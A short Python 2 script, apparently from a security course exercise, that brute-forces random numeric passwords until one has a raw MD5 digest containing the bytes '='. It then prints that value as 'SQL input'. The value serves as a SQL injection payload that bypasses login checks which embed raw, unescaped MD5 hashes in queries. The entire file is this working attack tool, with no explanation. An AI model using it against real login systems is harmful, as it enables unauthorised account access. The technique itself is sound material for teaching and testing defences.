from pymd5 import md5
import os, random, re, time


start = time.time()
while(True):
    maxint = (2**32) - 1
    password = str(random.randint(0, maxint))
    md = md5(password).digest()
    match = re.search(r"'='", md)
    #print md
    if match:
        print "SQL input:\t", password
        break
end = time.time()
print "Elapsed time:\t", end - start, "seconds"
